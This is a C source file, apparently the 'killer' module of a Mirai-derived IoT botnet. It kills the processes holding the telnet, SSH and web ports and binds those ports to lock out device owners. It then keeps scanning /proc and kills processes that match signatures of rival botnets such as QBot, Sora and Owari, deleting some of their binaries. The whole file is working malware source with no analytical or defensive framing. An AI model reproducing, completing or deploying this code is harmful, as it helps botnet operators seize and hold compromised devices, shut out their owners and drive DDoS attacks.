#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    #ifdef CUM_KILLER
    if (killer_kill_by_port(htons(23)))
    {
    } else {
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }

    if (killer_kill_by_port(htons(22)))
    {
    }
    tmp_bind_addr.sin_port = htons(22);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
    if (killer_kill_by_port(htons(80)))
    {
    }
    tmp_bind_addr.sin_port = htons(80);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
    if (killer_kill_by_port(htons(81)))
    {
    }
    tmp_bind_addr.sin_port = htons(81);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
    if (killer_kill_by_port(htons(8443)))
    {
    }
    tmp_bind_addr.sin_port = htons(8443);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
    if (killer_kill_by_port(htons(9009)))
    {
    }
    tmp_bind_addr.sin_port = htons(9009);
    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
    #endif

    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
        return;
    }

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);

            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);

            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0;

                table_unlock_val(TABLE_KILLER_ANIME);
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);

                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
                kill(pid, 9);
            } 

            
            
            /*if (upx_scan_match(exe_path, status_path))
            {
                kill(pid, 9);
            }*/
            

            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];


    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0)
    {
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }


    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);

                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);

    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return TRUE;
}


/*static BOOL status_upx_check(char *exe_path, char *status_path)
{
    int fd, ret;

    if ((fd = open(exe_path, O_RDONLY)) != -1)
    {
        close(fd);
        return FALSE;
    }

    if ((fd = open(status_path, O_RDONLY)) == -1)
        return FALSE;

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||
            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||
            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))
        {
            found = TRUE;
            break;
        }
    }

    close(fd);
    return FALSE;
}*/



static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_mirai, *m_sora1, *m_sora2, *m_sora3, *m_owari, *m_owari2, *m_josho, *m_apollo, *m_route, *m_cpuinfo, *m_bogo, *m_rc, *m_masuta1, *m_mirai1, *m_mirai2, *m_vamp1, *m_vamp3, *m_irc1, *m_qbot1, *m_qbot2, *m_irc2, *m_mirai3, *m_omni, *m_shinto3, *m_shinto5, *m_josho5, *m_josho4, *m_lol;
    int m_mirai_len, m_ares_len, m_sora1_len, m_sora2_len, m_sora3_len, m_owari_len, m_owari2_len, m_josho_len, m_apollo_len, m_route_len, m_cpuinfo_len, m_bogo_len, m_rc_len, m_masuta1_len, m_mirai1_len, m_mirai2_len, m_vamp1_len, m_vamp3_len, m_irc1_len, m_qbot1_len, m_qbot2_len, m_irc2_len, m_mirai3_len, m_omni_len, m_shinto3_len, m_shinto5_len, m_josho5_len, m_josho4_len, m_lol_len;
    BOOL found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_EXEC_MIRAI);
    table_unlock_val(TABLE_EXEC_SORA1);
    table_unlock_val(TABLE_EXEC_SORA2);
    table_unlock_val(TABLE_EXEC_SORA3);
    table_unlock_val(TABLE_EXEC_OWARI);
    table_unlock_val(TABLE_EXEC_OWARI2);
    table_unlock_val(TABLE_EXEC_JOSHO);
    table_unlock_val(TABLE_EXEC_APOLLO);
    table_unlock_val(TABLE_EXEC_ROUTE);
    table_unlock_val(TABLE_EXEC_CPUINFO);
    table_unlock_val(TABLE_EXEC_BOGO);
    table_unlock_val(TABLE_EXEC_RC);
    table_unlock_val(TABLE_EXEC_MASUTA1);
    table_unlock_val(TABLE_EXEC_MIRAI1);
    table_unlock_val(TABLE_EXEC_MIRAI2);
    table_unlock_val(TABLE_EXEC_VAMP1);
    table_unlock_val(TABLE_EXEC_VAMP3);
    table_unlock_val(TABLE_EXEC_IRC1);
    table_unlock_val(TABLE_EXEC_QBOT1);
    table_unlock_val(TABLE_EXEC_QBOT2);
    table_unlock_val(TABLE_EXEC_IRC2);
    table_unlock_val(TABLE_EXEC_MIRAI3);
    table_unlock_val(TABLE_EXEC_OMNI);
    table_unlock_val(TABLE_EXEC_SHINTO3);
    table_unlock_val(TABLE_EXEC_SHINTO5);
    table_unlock_val(TABLE_EXEC_JOSHO5);
    table_unlock_val(TABLE_EXEC_JOSHO4);
    table_unlock_val(TABLE_EXEC_LOL);

    m_mirai = table_retrieve_val(TABLE_EXEC_MIRAI, &m_mirai_len);
    m_sora1 = table_retrieve_val(TABLE_EXEC_SORA1, &m_sora1_len);
    m_sora2 = table_retrieve_val(TABLE_EXEC_SORA2, &m_sora2_len);
    m_sora3 = table_retrieve_val(TABLE_EXEC_SORA3, &m_sora3_len);
    m_owari = table_retrieve_val(TABLE_EXEC_OWARI, &m_owari_len);
    m_owari2 = table_retrieve_val(TABLE_EXEC_OWARI2, &m_owari2_len);
    m_josho = table_retrieve_val(TABLE_EXEC_JOSHO, &m_josho_len);
    m_apollo = table_retrieve_val(TABLE_EXEC_APOLLO, &m_apollo_len);
    m_route = table_retrieve_val(TABLE_EXEC_ROUTE, &m_route_len);
    m_cpuinfo = table_retrieve_val(TABLE_EXEC_CPUINFO, &m_cpuinfo_len);
    m_bogo = table_retrieve_val(TABLE_EXEC_BOGO, &m_bogo_len);
    m_rc = table_retrieve_val(TABLE_EXEC_RC, &m_rc_len);
    m_masuta1 = table_retrieve_val(TABLE_EXEC_MASUTA1, &m_masuta1_len);
    m_mirai1 = table_retrieve_val(TABLE_EXEC_MIRAI1, &m_mirai1_len);
    m_mirai2 = table_retrieve_val(TABLE_EXEC_MIRAI2, &m_mirai2_len);
    m_vamp1 = table_retrieve_val(TABLE_EXEC_VAMP1, &m_vamp1_len);
    m_vamp3 = table_retrieve_val(TABLE_EXEC_VAMP3, &m_vamp3_len);
    m_irc1 = table_retrieve_val(TABLE_EXEC_IRC1, &m_irc1_len);
    m_qbot1 = table_retrieve_val(TABLE_EXEC_QBOT1, &m_qbot1_len);
    m_qbot2 = table_retrieve_val(TABLE_EXEC_QBOT2, &m_qbot2_len);
    m_irc2 = table_retrieve_val(TABLE_EXEC_IRC2, &m_irc2_len);
    m_mirai3 = table_retrieve_val(TABLE_EXEC_MIRAI3, &m_mirai3_len);
    m_omni = table_retrieve_val(TABLE_EXEC_OMNI, &m_omni_len);
    m_shinto3 = table_retrieve_val(TABLE_EXEC_SHINTO3, &m_shinto3_len);
    m_shinto5 = table_retrieve_val(TABLE_EXEC_SHINTO5, &m_shinto5_len);
    m_josho5 = table_retrieve_val(TABLE_EXEC_JOSHO5, &m_josho5_len);
    m_josho4 = table_retrieve_val(TABLE_EXEC_JOSHO4, &m_josho4_len);
    m_lol = table_retrieve_val(TABLE_EXEC_LOL, &m_lol_len);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_mirai, m_mirai_len) ||
            mem_exists(rdbuf, ret, m_sora1, m_sora1_len) ||
            mem_exists(rdbuf, ret, m_sora2, m_sora2_len) ||
            mem_exists(rdbuf, ret, m_sora3, m_sora3_len) ||
            mem_exists(rdbuf, ret, m_owari, m_owari_len) ||
            mem_exists(rdbuf, ret, m_owari2, m_owari2_len) ||
            mem_exists(rdbuf, ret, m_josho, m_josho_len) ||
            mem_exists(rdbuf, ret, m_apollo, m_apollo_len) ||
            mem_exists(rdbuf, ret, m_route, m_route_len) ||
            mem_exists(rdbuf, ret, m_cpuinfo, m_cpuinfo_len) ||
            mem_exists(rdbuf, ret, m_bogo, m_bogo_len) ||
            mem_exists(rdbuf, ret, m_rc, m_rc_len) ||
            mem_exists(rdbuf, ret, m_masuta1, m_masuta1_len) ||
            mem_exists(rdbuf, ret, m_mirai1, m_mirai1_len) ||
            mem_exists(rdbuf, ret, m_mirai2, m_mirai2_len) ||
            mem_exists(rdbuf, ret, m_vamp1, m_vamp1_len) ||
            mem_exists(rdbuf, ret, m_vamp3, m_vamp3_len) ||
            mem_exists(rdbuf, ret, m_irc1, m_irc1_len) ||
            mem_exists(rdbuf, ret, m_qbot1, m_qbot1_len) ||
            mem_exists(rdbuf, ret, m_qbot2, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_irc2, m_irc2_len) ||
            mem_exists(rdbuf, ret, m_mirai3, m_mirai3_len) ||
            mem_exists(rdbuf, ret, m_omni, m_omni_len) ||
            mem_exists(rdbuf, ret, m_shinto3, m_shinto3_len) ||
            mem_exists(rdbuf, ret, m_shinto5, m_shinto5_len) ||
            mem_exists(rdbuf, ret, m_josho5, m_josho5_len) ||
            mem_exists(rdbuf, ret, m_josho4, m_josho4_len) ||
            mem_exists(rdbuf, ret, m_lol, m_lol_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_EXEC_MIRAI);
    table_lock_val(TABLE_EXEC_SORA1);
    table_lock_val(TABLE_EXEC_SORA2);
    table_lock_val(TABLE_EXEC_SORA3);
    table_lock_val(TABLE_EXEC_OWARI);
    table_lock_val(TABLE_EXEC_OWARI2);
    table_lock_val(TABLE_EXEC_JOSHO);
    table_lock_val(TABLE_EXEC_APOLLO);
    table_lock_val(TABLE_EXEC_ROUTE);
    table_lock_val(TABLE_EXEC_CPUINFO);
    table_lock_val(TABLE_EXEC_BOGO);
    table_lock_val(TABLE_EXEC_RC);
    table_lock_val(TABLE_EXEC_MASUTA1);
    table_lock_val(TABLE_EXEC_MIRAI1);
    table_lock_val(TABLE_EXEC_MIRAI2);
    table_lock_val(TABLE_EXEC_VAMP1);
    table_lock_val(TABLE_EXEC_VAMP3);
    table_lock_val(TABLE_EXEC_IRC1);
    table_lock_val(TABLE_EXEC_QBOT1);
    table_lock_val(TABLE_EXEC_QBOT2);
    table_lock_val(TABLE_EXEC_IRC2);
    table_lock_val(TABLE_EXEC_MIRAI3);
    table_lock_val(TABLE_EXEC_OMNI);
    table_lock_val(TABLE_EXEC_SHINTO3);
    table_lock_val(TABLE_EXEC_SHINTO5);
    table_lock_val(TABLE_EXEC_JOSHO5);
    table_lock_val(TABLE_EXEC_JOSHO4);
    table_lock_val(TABLE_EXEC_LOL);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
